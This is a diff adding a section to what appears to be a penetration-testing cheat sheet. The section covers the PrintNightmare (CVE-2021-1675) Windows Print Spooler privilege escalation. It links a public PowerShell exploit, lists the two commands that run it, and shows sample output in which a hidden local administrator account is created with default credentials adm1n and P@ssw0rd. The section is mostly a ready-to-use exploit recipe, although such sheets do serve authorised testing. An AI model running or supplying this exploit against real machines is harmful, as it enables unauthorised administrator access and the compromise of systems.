@@ -1465,4 +1465,29 @@ https://github.com/micahvandeusen/GenericPotato
   -h, --help                 Display this help
 ```
 
-  ## printnightmare CVE-2021-1675
+  ## printnightmare 
+  CVE-2021-1675
+  
+  Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare) 
+  
+  ```
+  https://github.com/calebstewart/CVE-2021-1675
+  ```
+  
+  easy basic example: 
+  ```
+  Import-Module .\CVE-2021-1675.ps1
+  ```
+  ```
+  Invoke-Nightmare
+  ```
+  
+  and you will get a output like: 
+  ```
+  [+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
+  ```
